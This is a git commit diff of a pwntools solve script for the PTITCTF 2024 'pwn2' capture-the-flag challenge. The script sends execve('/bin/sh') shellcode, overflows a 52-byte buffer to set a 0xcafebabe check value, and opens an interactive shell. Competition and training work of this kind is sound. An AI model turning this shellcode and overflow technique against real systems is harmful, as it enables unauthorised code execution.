5df241e5597f369af32c4d100769c3552b92a27e
nhh9905 <hoanglclvt@gmail.com>
2025-04-09 15:39:54 +0700

    pwn

--- PTITCTF 2024/Semi-final/Pwnable/pwn2/solution/solve.py
+++ PTITCTF 2024/Semi-final/Pwnable/pwn2/solution/solve.py
@@ -1,13 +1,24 @@
 from pwn import *
 
-p = process("./pwn2")
+exe = ELF('./pwn2', checksec=False)
+p = process(exe.path)
 # p = remote("14.225.255.41", 13333)
-p.recvuntil("Enter your name: ")
-shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 
-payload = shellcode
-p.sendline(payload)
-payload = b"a"*52 + p32(0xCAFEBABE)
+# input()
+shellcode = asm(
+    '''
+    mov rax, 0x3b
+    mov rdi, 29400045130965551
+    push rdi
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
 
-p.sendline(payload)
+    syscall
+    ''', arch='amd64')
+
+p.sendlineafter(b'name: ', shellcode)
+payload = b'a'*52 + p32(0xcafebabe)
+p.sendlineafter(b'studentID: ', payload)
+
 p.interactive()
